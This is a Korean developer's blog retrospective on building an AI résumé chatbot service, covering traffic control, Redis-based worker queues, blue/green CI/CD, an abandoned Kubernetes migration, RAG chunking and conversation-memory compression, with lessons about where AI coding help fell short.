<p>VectorDB는 AI 의 RAG 의 핵심 도구이자 그 중에서도 기존의 SQL 로서의 기능과 함께 하이브리드로 사용하기 적절한 postgrSQL 을 채택했다. 비즈니스적으로 구현할 사항은 그대로 SQL을 이용하되, RAG 를 위한 벡터 데이터를 위해선 MinIO 를 기반으로 원본 데이터를 보관하고, VectorDB 를 기반으로 구직자들의 다양한 자료들을 최대한 잘 Parsing 하고, 이를 RAG 하도록 구성했다.</p>

<p>또한 NestJS, FastAPI 를 구분하였는데, 이는 비즈니스 로직의 안정성 내지는 관리를 용이하게 만들며, LLM 과의 통신, AI 기능을 위한 핵심 내용만 FastAPI 가 담당하도록 구성하였다. 이는 장애 전파를 막고 독립적 스케일 아웃을 가능하게 만드려고 했다.</p>

<p>왜냐하면 AI 서비스는 필연적으로 고비용/고부하 작업인데, 결국 아무리 많은 요청이 들어와도 해결하도록 만드는 것을 핵심으로 잡았기에, 유량 제어 계층(Traffic Dam) 아키텍쳐를 NestJS 에 설계 단계부터 구성했다. 이와 연동되어 FastAPI 의 상태 확인 모니터링으로, Worker 가 적절하게 일을 하는 지를 확인하고 이 정보를 Redis 를 활용해 전파, Traffic Dam 이 트래픽 뿐만 아니라 Worker 의 상태에도 맞춰서 동작할 수 있도록 구성했다.</p>

<p>그외의 영역으로는 Redis는 핵심 비동기 큐의 역할로서, LLM 의 추론 및 요청을 받아내는 Worker 와 NestJS 를 독립적으로 구동시키는 핵심 역할을 하게 만들었다. 또한 그 외에도 서버끼리의 통신으로 섬세하게 트래픽 양을 제어, 각 서버가 서로에게 영향을 서로 파악하는 용도의 핵심을 Redis를 선정하였다. 이는 Kafka 나 Rabbit MQ 를 쓸 수도 있었으나, 현실적인 개발 일정, 다른 집중할 영역을 위하여 과감히 구현이 빠르게 가능하므로 선정했다. 또한 TLS Proxy Pass 를 설정한 부분은, 서비스 이용자들의 접근 루트와, 관리자의 루트를 분리함으로 관리와 서비스의 명확한 구분을 위하여 설정하게 되었다.</p>

<p>이렇게 구성하게 된 것은 위에서 언급한 생각들을 정리하여 얻은 결론, 목표를 위함이다.</p>

<ol>
  <li><strong>AI 서비스의 특성을 고려하고, 백엔드의 깊이있는 구현을 위하여 비즈니스와 AI를 분리하고, 실무 수준의 구성을 갖춰낸다.</strong></li>
  <li><strong>유량 제어를 포함, 고가용성을 확보하는 심도있는 테스트 설계, 데이터 기반의 스케일 아웃 전략 고려 등, 가능한 현재의 서버 상황의 가장 최적인 서비스 상태를 구현하는 노력을 해본다.</strong></li>
  <li><strong>AI 챗봇으로 AI가 기억을 가지고, 적절한 답변을 가능하게 구현한다.</strong></li>
  <li><strong>기존 실무에서 사용하고 적용했던 기술들을 직접 재구성해보고, 나의 기술 스택과 인사이트를 독자적으로 구현이 가능한지 검증한다.</strong></li>
</ol>

<h3 id="what-i-learned">What I Learned</h3>

<p><img src="/assets/images/posts/2026-02/005.png" alt="" /></p>
<blockquote>
  <p>Before 테스트 당시 컨테이너 상태 , 제대로 FastAPI 서버 동작 하지 않음…</p>
</blockquote>

<p><img src="/assets/images/posts/2026-02/006.png" alt="" /></p>
<blockquote>
  <p>After 테스트 당시 컨테이너, 두배 스케일 아웃 및 새로운 컨테이너(FastAPI)의 동작이 관측 된다.</p>
</blockquote>

<h4 id="네트워크와-서버의-상호작용은-결코-기계적이지-않다">네트워크와 서버의 상호작용은 ‘결코’ 기계적이지 않다</h4>
<p>처음 서버 끼리의 통신을 접했을 때, 그리고 연결시켜서 결과가 나왔을 때, 그 순간은 짜릿했다. 내가 만든 룰과 규칙에 따라 가공되고, 사용자에게 필요한 서비스의 데이터를 내준다. 이것은 아주 심플하고, AI가 등장한 이래로는 아니 그 이전부터 별게 아닌 기초의 영역이었다.</p>

<p><strong>하지만 이번 프로젝트를 진행하기 직전, React2Shell 취약점을 경험하고 나면서 ‘가벼운 생각’은 좀더 진지하게 생각해보게 되었다</strong>. npm 패키지를 통한 악성 코드들, 취약점이 튀어나오고, 그걸 기반으로 시스템을 휘젓는 공격. 온프레미스 서버의 next.js 가 공격 당했을 때는 CPU 사용률을 800%까지 끌어 올렸고, 시스템을 엉망으로 만들었다. 인터넷 회선 장비들이 느려지고, 오작동을 하게 만들었다. 구축한 온프레미스 서버의 프론트 서버가 아닌 서버들 조차 느려지게 만드는 것을 발견하였다. 간단한 api 통신, 그러나 순수하게 짜둔 그것에 취약점이 연결되자 엄청난 일이 일어난 것이다.</p>

<p>그렇기에 고민했다. 이런 일이 있다. 실제로 공격은 당한다. 그렇다면 구현하려고 생각한 Protostar에선 어떻게 대응하면 될까. 그렇기에 토스와 함께 하게된 이 프로젝트에서는, 진짜 실무에 필요한 수준의 가능한 정교한 수준의 Traffic Dam 을 구축해보고자 마음을 먹게되었다. 더불어서버들이 갖춰야 할 다른 Traffic 에 대한 제어 기술들을 가능한 철저하게 찾아보고, Token Bucket, Sliding Window 같은 전략이 어떻게 제어를 하고, 그 결과 trade-off 를 어떤 지점에서 발생되는지를 배우려고 노력했고, 지금 그 과정을 통해 배웠던 내용을 정리해본다.</p>

<p>처음엔 기본 로직만 만든 채 k6 기반의 가상의 사용자를 기반으로 테스트를 진행했다. 수 천번의 연결 요청, 서버는 허덕이고, CPU 이용률은 올라간다. 그렇게 반응의 결과를 받아서, AI와 함께 분석하며 그 의미를 해석하려고 했다. 그 뒤엔 그 기록을 기반으로 Traffic Dam 과 각종 장치들을 통해 얼마나 막는게 가능할지 가정을 세워 보았고, 실제로 After Test 를 통해 비교해보았다.</p>

<p>이러한 과정을 겪으면서, 가장 먼저 깨달은 점은 하드웨어의 특성도 이해하게 된다는 점, 그리고 각 서버들의 구성이나 차이를 특히 이해할 수 있게 되었다는 점이다. Scale-out 에 대한 적용 시의 특징도 파악이 되었다. 결론적으로 1대의 수평 확장을 하더라도, 감당 가능한 트래픽의 수치는 선형으로 대응하지 않으며, 오히려 효율이 83%를 기록하며 트래픽에 대응할 수 있었다.  특히나 이를 위하여 기술적으로 Stateless 하게 만들려고 신경을 썼으며, 서버 사이의 통신을 단순히 서버끼리 연결시키지 않고, Redis 를 통신의 가교로 둠으로써, 소통하는 구조를 구현하였고, 설계 구조나 이론적으로 수평으로 무한히 연결 되도 가능하도록 구현을 진행하였다.</p>

<p>그런데 막상 거기까지 진행하고 나서 신기한 경험을 하게 되었다. <strong>실제 비즈니스 로직과 AI 워커 로직은 상태 정보 없이 동작하도록 구축</strong>하였고, 그렇게 테스트를 했다. 그런데 이상한 버그들이 발생하는 것을 발견하였고, 최종적으로 <strong>‘통신을 수행한다’는 기능으로 인해 오히려 Stateful 한 특성을 가진 경우를 발견하게 되었고, 그것이 오류를 일으키는 것을 발견</strong>할 수 있었다.</p>

<p>대표적으로 Redis를 기반으로 대화의 세션을 이어갈 때, Redis 라는 인메모리 데이터베이스의 특성이 통신과 연동, 특정 작업이 state 적 성격을 띠게 되면서 마치 정상이 아닌데 정상처럼 카운트가 되거나 하는 일들이 벌어졌다. 즉, <strong>암묵적 상태 의존성(Implicit State Dependency)</strong> 가 발생한 것이었다. 이에 대해 알아보면서 <strong>설계적 stateless와 구성 전체의 stateless의 괴리</strong> 라고도 부르는 것이 발생 했음을 알 수 있었다.</p>

<p>또한 Pub/Sub 구조에서 큐에 NestJS 가 작업을 요청하고, AI  Worker 인 FastAPI 가 이 작업을 가져가서 수행, 그 결과를 다시 Redis를 향해 전달하는 구조인데, 이때 뜬금 없이 무중단 배포의 Green/Blue 전략의 특징이 버그를 만들어내기도 하였다. 서버의 롤백과 업데이트 시 대응을 위하여 Green, Blue의 컨테이너가 켜져있는데, Redis 로만 소통을 하다보니, 롤백 등을 위해 대기만 해야하는 한쪽 서버가 함께 동작을 하게 되면서 실제로 NestJS 서버 1대에 Worker 2대가 달라붙어 작업을 처리하는 경우가 생겼다. 이때 버전의 차이, API 의 차이가 생기면 어김없이 버그가 발생했지만, 문제는 표면적으로 그걸 찾아내는 것이 매우 곤란하였다. 서버들은 정상이며, 확인이 되지 않았다. 그러나 Loki 를 통해 서버들 전체의 로깅을 보았을 때, 그때 움직이지 말아야 하는 서버가 동작하고 있음을 보았을 땐… 여러모로 십년 묵은 체증이 내려간 기분이었다.</p>

<p>결론적으로 디버깅하는 과정에서 ‘스케일 아웃을 신경썼다’, ‘Stateless 가 되도록 로직을 짰다’ 라는 내 생각이 무색해지는 경험을 하고 말았다. <strong>서버 끼리의 상호작용, redis 등의 중간 연결체 등이 설정이 되었을 때 결코 ‘계산기’처럼 반응이 일정하게 나오지 않는다는 사실을 배운 것은 매우 값진 결과였다.</strong> 각각은 분명 Stateless인데(설계저 stateless), 그것들이 묶이고, 함께 동작하니(구성 전체의 stateless) 그때의 오작동은 찾아내기도 어렵고, 무엇보다 AI 는 이런 전체적인 맥락을 읽지 못했다. 결국 사람의 도전, 경험, CS 에 대한 이해도가 있어야만 이러한 일이 발생함의 힌트라도 얻을 수 있다는 사실은, 상당히 의미있는 배움이 되었고, 서비스의 설계 속에서 반드시 고려할 요소임을 알게 되었다. 결과적으로 <strong>Sticky Session 전략</strong>으로 session 을 강제하는 등의 방법론을 통해 개선 가능했다.</p>

<h4 id="infrastructure-의-구축이-가지는-가치를-실감하다">Infrastructure 의 구축이 가지는 가치를 실감하다</h4>

<p><img src="/assets/images/posts/2026-02/007.png" alt="" /></p>
<blockquote>
  <p>톡톡히 도움을 준 Jenkins</p>
</blockquote>

<p>이번 Protostar 프로젝트에서 프론트엔드와, 백엔드, 백엔드는 NestJS에서 FastAPI, 모니터링, DB들 … 여러 기술 스택을 도전하면서 계속해서 부딪히고 깨지길 반복했다. 각기 개별의 문제, AI 의 삽질, 그리고 그것들에 대해 진한 고민들. 조그만 게 하나씩 개선되어가는 일련의 작업들은 언뜻 도전적인 성장과 도전적인 변화를 일으켰다.</p>

<p>거기서 내가 무얼 잘했던가? 라고 한다면 사실 개발적인 영역은 결코 아닐거라 생각한다. 언어가 익숙할 뿐 React를 비롯 Next.js 에대한 이해도는 낮았으며, FastAPI 는 특히 기본 구조 자체가 Node 의 그것과 유사하여 NestJS 를 생각하면 안되는 것이다. 앞으로 계속해서 개선의 여지는 존재 한다. 그러나 <strong>여기서 분명 내가 잘한 부분은 무엇인가? 하면 ‘전체 구조의 설계’가 시작부터 어느 정도 완결성을 갖추고 시작했다는 점이다.</strong></p>

<p>Jenkins를 기반으로 CI/CD 의 파이프라인을 구축하고 GHCR를 활용해 이미지를 기록, 그리고 그것의 배포는 SSH에 키를 기반으로 진행된다. 그리고 이렇게 진행 될 때도 Green / Blue 를 빌드 번호를 기반으로 번갈아 업데이트 하는 구조를 가지고 있으며, 선택적으로 양쪽 다 업데이트가 가능하도록 설정한 Jenkinsfile의 구성. 실무에서 사용하던 도구들, 그때는 다소 누더기 같이 누벼져 있었으며 IaC(Infrastructure as Code)가 아닌 상태였다.</p>

<p>그때의 불편하고, 생산성을 방해하던 아쉬운 점들을 종합해서 <strong>‘재현 가능한 인프라(Reproducible Infrastructure)’</strong> 를 구현해냈다. 이렇게 구추된 전체 CI/CD 파이프라인은 내 작업의 과정에서 단 한번의 에러 없이 지속적으로 배포의 탄력을 유지하게 해주었다. 롤백을 원할 땐, main 브랜치를 롤백하면 되는 것이었고, 급한 경우 nginx 를 통해 서비스를 제공할 Gree/ Blue 를 수동 조작도 가능했다. 시스템은 망가지지 않으며, 어떤 식으로든 7/24 마음껏 개발-검증-배포를 가능하게 만들었다. 하루에 백번 조금 모자라게 업데이트를 시도할 수 있단 사실은 그것 만으로도 얼마나 ‘탄력적’이겠는가!</p>

<p>또한 <strong>품질 게이트(Quality Gate)</strong> 를 설정하여 코드를 formater, linter 등으로 Jenkinsfile을 통해 빌드 전에도 반드시 검사를 하도록 했다. 또한 CodeRabbit AI 라는 코드 검사 전용 AI를 코드 머지 및 배포 과정에 시스템적으로 배치시켰다. 이는 개인의 임의로 코드의 이상이나 버그를 급하다고 무조건 넘기지 않고, 자연스럽게 디버깅하는 과정을 넣는 결과로 이어졌다. 그러니 진행 과정에서 불안이나 부담을 느끼는게 아닌 ‘절차’ 그 자체로 만들었고, 이러한 방법을 적용했을 때, 배포 시에 코드 상에 문제로 버그가 발생할 일은 최대한 막을 수 있었다.</p>

<p>처음에 온프레미스 서버는 부담 그 자체였다. 구매의 비용도 비용이고, 그 구성에 일일히 설정하는 것, 개발도 전에 먼저 파이프라인을 구축하는 것은 사실 완전히 ‘빠른 개발’과 ‘빠른 배포’에 다소 어긋나는 것일지도 모르겠다. 차라리 효율성을 위해 AWS나, GCP 를 빌릴 수도 있다.</p>

<p>그러나 인프라의 모든 레이어를 직접 제어, <strong>샌드박스로서</strong> 1달의 개발 과정에서 빠른 try &amp; catch error 를 할 수 있다는 점은 백엔드 개발자의 경험치 극대화의 최적화된 방법론이라 생각한다. <strong>스스로 온전히 전체를 이해함으로써 비용 효율적인 고가용성을 설계하는 방법을 보고 느끼며 습득할 수 있었다.</strong> 이러한 경험을 기반으로 향후에는 배포를 위한 템플릿을 준비해둠으로써 프로젝트의 안정적인 개발을 어떻게 하면 될지를 배울 수 있던 기회였다 생각한다.</p>

<p><img src="/assets/images/posts/2026-02/008.png" alt="" />
<img src="/assets/images/posts/2026-02/009.png" alt="" /></p>
<blockquote>
  <p>무료임에도 Code 퀄리티 상승에 톡톡한 역할을 한 CodeRabbit AI 서비스, AI 끼리 싸움을 붙였다(?)</p>
</blockquote>

<h4 id="도전-그리고-반복을-통해-얻어간-devops">도전, 그리고 반복을 통해 얻어간 DevOps</h4>
<p>본 프로젝트는 Protostar 프로젝트의 하위에서 트래픽의 제어, AI 챗봇 구현에 집중한 프로젝트이긴 했다. 그러나 앞서 설명했듯 현대적 DevOps를 이해하고 적용, k8s 의 실무적 도입 및 Docker 환경에서 탈출하는 것이 상당한 의미가 있으리라 판단했다.</p>

<p>Docker의 기술적 열세, k8s 기반의 실무 및 Iac(Infrastructure as Code)에서의 Docker 가 아닌 다른 기술들을 표준으로 도입했다. 시스템의 유사한 기능으로 발생하는 이중 오버헤드를 버리고, 리눅스의 순수한 컨테이너 시스템을 적극 도입했으며, 이는 더욱 안정적인 고가용성을 확보한다는 목표를 달성했고 실제로 많은 기업들이 이 방향성을 따라가고 있다. 그리하여 3년차 이상의 연차를 가지는 백엔드 개발자의 핵심 역량으로 이미 거의 확정적으로 많은 회사들이 요구하는 기술이다. 그렇기에 나 역시 피할 수 없이 배워야 하는 영역이라고 할 수 있다.</p>

<p>하지만 막막했다. 어떻게 배워야 하고, 어떻게 DevOps 의 역량으로 키워야 한단 말인가? 그렇다고 문서만 보고 한 세월 방대한 자료와 씨름을 해야 하는 건가? 사수도 없이, 스스로 모든 걸 하겠다고 하기엔 프로젝트의 달성이란 현실적인 목표 사이에서 욕심 많고 교만한 행동이라고 판단했다. 처음엔 CSI 설정이나 ArgoCD 기반의 GitOps 구성에서 어디서 어떻게 에러가 나는지를 이해하기도 쉽지 않았다. 그렇기에 AI 를 기반으로 최대한 구조를 베껴가면서 k8s 를 프로젝트 하기 전 배워나갔고, 헬름 차트를 기반으로 고가용성을 구축한 패키지를 따라서 설치하는 식으로 제대로 k8s 내부에서의 배포 환경을 구축하려고 했으나… <strong>결론적으로 본 프로젝트, 한 달 내에서는 이루지 못한다고 판단, 포기하였고, Docker 를 다시 채택하여 진행을 하게 되었다.</strong></p>

<p>이유는 심플하다. AI 를 기반으로 배우면서 작업이 들어가는데, 1) 구성의 복잡도를 제로 베이스에서 구현하기는 어려웠다. 2) 특히 각 구성 요소들의 민감한 버전관리를 이해해야 하는데 AI조차 이를 이해하지 못했다. 특히나 3) 버전에 따른 스크립트 설정의 문법의 차이, 4) 실무 수준에서 사용하는 차트에 대하여 AI에 의존해서 AI 가 제작한 스크립트 코드들은 전혀 동작하지 않았고, 오류를 뿜었다. 결국 <strong>핵심은 k8s 를 만만하게 보았고 동시에 AI의 수준을 제대로 인지하지 못한, 과도한 의존이 문제인 것이다.</strong></p>

<p>그리하여… 나에게 결단이 필요했다. 토스의 러너스 하이 2기를 시작하기 직전이었고 더 이상의 딜레이, k8s 를 안고 가기엔 시간이 더 걸리고, 그러면 전체 개발의 목표를 달성하기엔 쉽지 않을 것이란 계산이 되었다. 그렇기에 과감한 결단을 내릴 필요가 있었고, 그 뒤에 해야할 일은 밤낮을 가리지 않는 Docker 기반으로의 회귀, 반복되는 마이그레이션 및 배포 파이프라인에 대한 반복적인 연습이었다.</p>

<p><strong>결론적으로, 그렇게 반복, 실패, 재도전과 개선 작업 등을 반복적으로 진행했다. 사실 뼈 아픈 실패였다.</strong> 그럼에도 긍정적으로 생각할 수 있는 점은 정상적인 배포 파이프라인, 구성들이 동작하게 만들기 위한 무한의 반복, 실패, 마이그레이션의 경험은 DevOps 라는 영역의 요소들에 대한 이해도, 사용 방법에 익숙해졌다는 점이다. 관리 시 뭘 보아야 하고, 에러가 나면 무얼 먼저 챙겨야 하는지 등을 알게 되었다. 특히 Docker 환경에서의 로컬, 프로덕션을 가리지 않고 매우 다양한 컨테이너들 사이에서 오케스트레이션 경험치를 쌓을 수 있었다. <strong>결국 실패와 반복은 성장으로 이어진다는 점을 명확히 배울 수 있었다.</strong></p>
<h4 id="ai는-프롬프트와-데이터-그리고-알고리즘의-전략성이-만들어낸다">AI는 프롬프트와 데이터, 그리고 알고리즘의 전략성이 만들어낸다</h4>
<p>AI를 도입하는 과정 역시 상당한 사건들이 있었고, 많은 것들을 배울 수 있었다.</p>

<p>처음엔 Protostar 의 컨셉에 부합하는 AI 답변이 가능할까? 를 우선 검증하고 싶었다. 이에 n8n을 활용해서 AI 호출, AI에게 요청하는 것을 테스트 해보았고, 특히 <code class="language-plaintext highlighter-rouge">planner</code>, <code class="language-plaintext highlighter-rouge">executor</code>, <code class="language-plaintext highlighter-rouge">inspector</code> 라는 별도의 역할을 부여하고, 로직대로 답변이 나오는지를 판단해보는 작업은 꽤나 신기한, 개발답지 않은 개발이었다.</p>

<p>그러나 막상 구성해본 결과는 다소 실망스러웠다. 우선 여러 단계를 거치는 식은 당연히 성능적 손해(지연시간, TTFT)가 크게 보였다. GPT-OSS-120B, gemini 2.5, 3.0등 왠만한 frontier 모델들, 그 외에도 여러 오픈 소스 모델 등등 OpenRouter 를 기반으로 테스트 해본 결과, 답변은 잘해주더라도 만족스러운 결과에 도달하진 못하는 것을 알 수 있었다. 특히 추론 비용(Token Cost)에서 불리한데, 심지어 긴 컨텍스트 창을 제공하는 gemini 모델들을 볼 땐, 차라리 모든 명령을 프롬프트로 적절하게 집어 넣고, <strong>단일 AI로 출력하는게 답변이 다중의 구조를 추가하는 것 만큼이나 이미 충분히 좋았다. 굳이 돌아가는 길을 갈 필요는 없던 것이다.</strong> 특히 3.0 버전 제미나이의 경우 비추론 모델이 오히려 추론 모델보다 시스템 프롬프트의 복잡성을 추가시 더 명료한 결과가 나오는 기이한 결과가 여기 저기 벤치상으로 나타났고, 응용 어플리케이션에선 최선이라고 판단되었다. (심지어 가장 싸다)</p>

<p><strong>뿐만 아니라, 구현 과정에서 느끼게 된 핵심은 ‘프롬프트’에 대한 엔지니어링의 중요성 부분이었다.</strong> 간단하게 모델 PoC만을 구현하고, AI Worker의 로직을 실증하기 위해, 이력서 데이터, 나의 개인정보를 프롬프트로 추가하고, 단일 모델, 그것도 수십권 분량의 토큰을 입력으로 받을 수 있는 모델을 사용했다. 그런데 결론은? 놀랍게도 AI 는 이력서의 데이터를 받아 들이자마자 <strong>특이한 행동</strong>을 하는 것을 발견했다.</p>

<p>이력서나, 경력 기술서 등, 이러한 문서가 들어오자 AI 는 제시하는 ‘요구사항’의 답을 하는 것을 우선시 하는게 아니라, <strong>프롬프트로 자료의 성격에 맞춰, 이력을 소개하는 답만 반복적으로 출력했다</strong>. 이는 <strong>‘자료 편향(Data Bias)’</strong> 이란 현상이다. 사용한 데이터에 따라 뒤에 올 가능성이 가장 높은 말을 하는게 LLM 이다보니, 이러한 과도한 데이터가 프롬프트, 체계없이 들어오는 순간 실제 요구사항은 희석되고, 데이터가 제시하는 방향성을 따르게 된다. 그 결과 이력서, 경력 기술서란 곧 홍보를 위한 글이다보니, ‘사람 처럼’ 자신의 능력을 어필하기만 하는 고장을 경험하게 되었다.</p>

<p>뿐만 아니라, 데이터들의 선별에도 곤란함을 겪었는데, 고작 A4 10장 정도의 데이터를 기반으로 여러번 질문했다. 순수하게 아무런 기교 없이 프롬프트로 넣은 그것들은 데이터들의 구체적인 정보 한 줄을 설명하지 못했다. <strong>항상 뭉뚱그려진 데이터를 어수룩하게  답변을 했다.</strong> 또한 경력 자료의 특성 상 수치나 실질적인 성과에 대한 이야기를 하게 되는데, 이때 이 수치적인 부분의 누락은 치명적인 영역이었다. 함부로 이상한 수치로 바꿔 말하는 순간, 신뢰성을 어떻게 확보하겠고, 이 서비스를 누가 쓰겠는가? 그렇기에 결국 도달한 결론이 RAG(검색 증강 생성)이 필수 였으며, 연관성을 위한 자료의 적절한 파싱, Vector 화 및 VectorDB의 필요성이 대두되었다.</p>

<p>여기서도 Vector 화를 위하여 문자를 파싱하는데 단순하게 ‘개행 단위’로 할 것인가? 아니면 어떤 식으로든 원본 데이터를 ‘AI 가 이해하기 편한 형태’로 만들 것인가? 라는 질문을 할수 있었고 실제로도 데이터의 질이 조금만 달라도 파편화된 데이터, 정보를 정확하게 설명하지 못하는 것을 볼 수 있었다. 이리저리 테스트 해본 결과 지금은 <strong>‘문단 단위’로 파싱하는 것</strong>을 기본으로 삼았다. 이렇게 하는 것이 헤더 단위에서의 전체 내용을 포함하기 용이했기 때문이다. 단순 개행은 의미적 응집성이 약하며, 정보의 완결성 유지가 애매하기 때문이다. 또한 원본 데이터를 가능한 핵심, 키워드, 내용을 함께 묶어서 AI 가 키워드 기반 Retrieval(Top-K)방식으로 신뢰도를 확보했다.</p>

<p>이젠 대화의 ‘기억력’을 만들어야 하는 시점이 되었다. RAG 를 구축하고, DB를 통해 vector화된 데이터, 이를 위한 업로드 로직까지 했지만 한번 대화 이후 새로운 요청에는 기억을 상실한 채 답변을 할 뿐이었다. <strong>이용자들에게 맥락을 이어가는 질문을 할 수 없다는 것은 사용성에서 치명적이라고 생각했다.</strong> 한편으론 프롬프트로 데이터를 채워서 진행할 수 있었으니, 아주 간단하게 기억력 구현을 생각하면 기존의 대화를 ‘기존 대화’라는 형태로 묶어서 데이터를 보내면 얼추 되기는 하다는 점을 알 수 있었다. 하지만 현실적으로, 그렇게 할 경우 입력과 출력의 ‘토큰량’은 감당할 수 없을 만큼 폭증하는 것은 자명했다.</p>

<p>그렇기에 고민한 결과, 대화를 가능한 ‘한~두 문장’으로 ‘압축’하는 비즈니스 로직을 새롭게 설계했다. AI Worker 가 답변을 생성 후, 다음 요청 전에 worker 가 다시 별도로 작업을 생성, Redis 에 등록하여 요약을 비동기로 수행하도록 구현해보았다. <strong>결과적으로 동일한 질문을 진행했을 때 토큰 압축을 통한 기억력은 매우 명료한 기억을 가지고 있으면서도, 원본 대비 약 73% 수준의 입력 토큰 수량 감소를 달성했다.</strong> 단순하게 전체 입력에 추가하는 것 대비 <strong>1.63회</strong>만 이렇게 압축해도 비용 효용성이 발생했다. 이로서 2턴 이상의 대화는 원본 대비 3 ~ 4배 정도의 비용절감이 발생할 수 있게 되었다.</p>

<p>결론적으로 AI의 폭발적인 성장, 그리고 AI로 무언가를 하게 만드는 과정은 대단히 ‘신선했다’. 전부터 계속 기술에 대한 팔로우업을 했었고 그렇기에 구현도 생각보다 빠르게 가능했다. 그럼에도 막상 실제 개발 과정에서 보이는 ‘자연어 데이터’를 어떤 식의 접근으로 압축하고, 제시하고, 로직을 통해 작업하게 만드는 가, 또한 AI 에게 효과적으로 보여주느냐를 고려하는 이 과정은 개발자로서 0 아니면 1이라는 감각과는 다른, 보다 기획에 가까운 경험을 제공했다. 네트워크 관련 데이터 해석이 필요하다보니 function calling, mcp 연계 구현 등 아직 그 잠재력은 훨씬 늘어날 수 있다는 걸 생각하면, 앞으로 계속 백엔드이자 응용 어플리케이션을 위한 AI 개발의 감각과 기술에 대한 연습의 필요를 느낀 계기가 되었다. 
<img src="/assets/images/posts/2026-02/010.png" alt="" /></p>
<blockquote>
  <p>RAG 용 데이터 업로드를 위한 실시간 페이지</p>
</blockquote>

<p><img src="/assets/images/posts/2026-02/011.png" alt="" /></p>
<blockquote>
  <p>기억력 검증</p>
</blockquote>

<p><img src="/assets/images/posts/2026-02/012.png" alt="" /></p>
<blockquote>
  <p>RAG 에 없는 데이터는 출력하지 않음</p>
</blockquote>

<p><img src="/assets/images/posts/2026-02/013.png" alt="" /></p>
<blockquote>
  <p>RAG 적용 예시</p>
</blockquote>

<h4 id="도전을-방해하는-ai-도전의-허들을-허무는-ai">도전을 방해하는 AI, 도전의 허들을 허무는 AI</h4>
<p>마지막으로 개인적으로 확실하게 각인된 부분, 그것은 AI가 나라는 개발자에게 ‘무얼 해줄 수 있고’ 반대로 ‘무얼 방해하는가’라는 부분이다.</p>

<p>1달, 풀스텍의 개발과정의 도전은 꽤나 고무적이지만, 겉으로 보기에 그렇지 결국 좌절의 연속과 망설임의 연속이었다. 새로운 것을 배운다는 자를 계속하고, 치열해진다는 것은 정신력의 소모가 너무 심한 일이였다. 이 때 AI 기반으로 새로운 k8s의 도입을 실패하고, 목표를 위해선 몇 달 공부하고 씨름하던걸 내려 놓아야 한다는 판단이 들었을 때는 끔직했다. 또 그렇고 나니 새로운 걸 배우는게 더 큰 실패를 불러올까 싶어 두려웠다.</p>

<p>AI는 예민한 고가용성 도구들의 헬름차트들을 위한 스크립트를 짜준다. 아마도 ‘딸깍’하고 해결해줄것 같았다. 실제로 구버전에 대해선 어렵지 않게 쓰는것이 가능할 거라 판단된다. <strong>하지만 기술의 발전, 그 속도에 못 따라가고 있었다. 과거의 것도 가져왔지만 결국 ‘그럴 듯한 스크립트’지, 100% 현재 구동 되는 걸 가져온 것도 아니다</strong>. 결국 스스로 배우고, 최신의 버전으로 엔터프라이즈급 구현을 하기엔 충돌이나, 최신에선 기존의 오픈소스 정책이 폐지되거나, 저장소 위치가 달라지는 등의 문제를 그대로 스스로 떠 안아야 했다.</p>

<p>이때 AI 의 구조상의 한계는 명확하다. AI는 여전히 ‘그럴 듯 하게’ 짜는 건 가능했지만, 복잡한 실무 수준의 그것을 하기엔 단순하게 요청-받기 하는 식으론 어렵다. 결국 인프라의 상태를 인지하지 못하는 stateless 한 조언자로서 명백한 한계를 가진다. 그리고 그 극단적인 예시가 최신의 k8s 도입 실패며, 이때 필요한 건 현재의 가장 최신에 확실한 문서를 통한 교차 검증, 사람을 통한 맥락의 이해였다.</p>

<p>그러나 <strong>동시에 새롭게 배우는데 도구로서 AI는 최상의 파트너이자, 다음 수준으로 올라가기에 적절한 도구였다.</strong> 간단한 예시 코드를 가져와 돌려보고, 핵심을 파악하고 새로운 것을 도입하는데 있어서는 AI 만한게 없었다. FastAPI 에서 OpenAI 의 API 구로 OpenRouter 를 연결하고, Redis 를 기반으로 message를 활용한 접근 법을 도전한다던지, 예전 같다면 새로운라이브러리 하나에 최소 일주일 ~ 한달은 걸릴 것을 3일에서 일주일 안에 해결하도록 만들었다.</p>

<p>이러한 것이 가능했던 이유는, 스스로 접근하려면 공식 문서를 한땀한땀 데모 부분을 읽고 판단해야 했지만, 그러한 영역을 포함해 데이터의 압축, 이해도, 소화력을 한꺼번에 올릴 수 있도록 돕는 AI는 이번 프로젝트를 성공적으로 마무리 할 수 있던 이유라고도 할 수 있겠다.</p>

<p>결과적으로 AI 는  방해하긴 했지만, 반대로 도와주기도 했다. AI 는 중립 그 자체이며, 임팩트도, 한계도 명확했다. 그러니 문득 이런 생각을 하게 되었다. ‘AI’ 는 돈, 혹은 공공재와 같은 것이지만 특히나 여기저기 도움이 되는 도구다. 그렇다면 이것은 일종의 중립적인 도구이며, 지금은 새로운 ‘수단’을 발견했기에 열광하지, 이것으로 답을 끝내는 것은 웃긴 생각이라고 판단이 섰다. 왜냐면 아무도 돈이 많다고 그걸로 끝이라고 하지 않으며, 금이 많다고 끝이라고 하진 않는다. 그걸 써서 무언가 하는 사람의 결과가 결국 그 가치를 빛내게 만드는 것이다. 어쩌면 AI의 영역은 늘어나고, 코드의 가치는 줄어 들겠지만, 시스템 전체에 대한 통합자, 문제의 정의자로의 역할이 개발자가 할 일이 되지 않을까? <strong>결국 ‘개발자의 가치’는 그 의미를 달라질지언정 그것의 존재가 사라지진 않을 것이란, 명확한 확신을 가지게 되었다.</strong></p>

<h3 id="what-i-missed">What I Missed</h3>
<h4 id="데이터-한-끗이-실수를-만든다">데이터, 한 끗이 실수를 만든다</h4>
<p>내가 실수 했던 영역을 정리해보면, 그렇다. 가장 뼈아픈 부분이 바로 데이터에 대한 부분이었다. SRE(Site Reliability Engineering)라는 키워드를 아는가? 사이트 신뢰성 공학, 운영에서 문제들을 수동 작업이 아닌 코드로 해결하고, 확장성을 세우는 것. 특히 허용 가능한 장애 범위를 이해하고, 트래픽 용량 계획을 세우는 등으로 필요한 대응이 미리 산정되고 준비되며, 지속적으로 이러한 구성 형태로 가용성과 성능을 관리하는 방법론이다. 이번 프로젝트 직전 처음, 트래픽에 대한 개념을 이해했고, Scale-Out 으로 진짜 대응이 되는지를 검증하자! 라는 생각을 하게 되었을 때 디테일하게 이를 이해하게 되었다. 또한 백엔드 개발자라고 표방한다면 무엇보다도 SRE 라는 것이, 가장 현실적이자, 이성적인 서비스 운영 방법론으로 이해하는게 필요하지 않을까 생각했다.</p>

